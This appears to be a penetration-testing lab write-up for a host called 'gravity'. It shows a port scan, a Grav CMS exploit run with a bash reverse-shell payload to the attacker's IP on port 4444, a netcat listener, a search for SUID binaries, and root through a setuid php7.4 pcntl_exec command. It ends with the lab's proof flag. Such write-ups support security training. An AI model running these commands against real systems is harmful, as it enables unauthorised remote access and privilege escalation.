`└─$ autonmap -H 192.168.190.12 -t all`

`Running all scans on 192.168.190.12`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

If we go to the http port, we can see it's Grav CMS
![[Pasted image 20240208113714.png]]

![[Pasted image 20240208113730.png]]

![[Pasted image 20240208113745.png]]

This takes us to 49788 which is a Metasploit module - but it doesn't work. So let's look for a PoC.

![[Pasted image 20240208113914.png]]

We run this with just the id command and it says completed successfully but we get no feedback.
Try again with a reverse shell.

`└─$ python exploit.py -c 'bash -i >& /dev/tcp/192.168.45.235/4444 0>&1' -t http://192.168.190.12/grav-admin`
[`*] Creating File`
`Scheduled task created for file creation, wait one minute`
`[*] Running file`
`Scheduled task created for command, wait one minute`
`Exploit completed`

Catch and upgrade

`└─$ nc -nlvp 4444`
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:4444`
`Ncat: Listening on 0.0.0.0:4444`
`Ncat: Connection from 192.168.190.12:40500.`
`bash: cannot set terminal process group (2825): Inappropriate ioctl for device`
`bash: no job control in this shell`
`www-data@gravity:~/html/grav-admin$ python -c 'import pty; pty.spawn("/bin/bash")'`
`<min$ python -c 'import pty; pty.spawn("/bin/bash")'`
`Command 'python' not found, did you mean:`
  `command 'python3' from deb python3`
  `command 'python' from deb python-is-python3`

`www-data@gravity:~/html/grav-admin$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
`<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'`
`www-data@gravity:~/html/grav-admin$` 

Look for applications where suid permission is set (ignore the garbage ones)
```
find / -perm -u=s 2>/dev/null | grep -v '^/proc\|^/run\|&/sys\|^/snap'
```

`/usr/lib/dbus-1.0/dbus-daemon-launch-helper`
`/usr/lib/eject/dmcrypt-get-device`
`/usr/lib/snapd/snap-confine`
`/usr/lib/openssh/ssh-keysign`
`/usr/lib/policykit-1/polkit-agent-helper-1`
`/usr/bin/chsh`
`/usr/bin/at`
`/usr/bin/su`
`/usr/bin/fusermount`
`/usr/bin/chfn`
`/usr/bin/umount`
`/usr/bin/sudo`
`/usr/bin/passwd`
`/usr/bin/newgrp`
`/usr/bin/mount`
`/usr/bin/php7.4`
`/usr/bin/gpasswd`

Setuid set on php7.4, check GTFObins

![[Pasted image 20240208115443.png]]

`/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"`

# `whoami`
`whoami`
`root`
# `cat /root/proof.txt`
`cat /root/proof.txt`
`50f67c7850de41bd40ed058abddcb322`
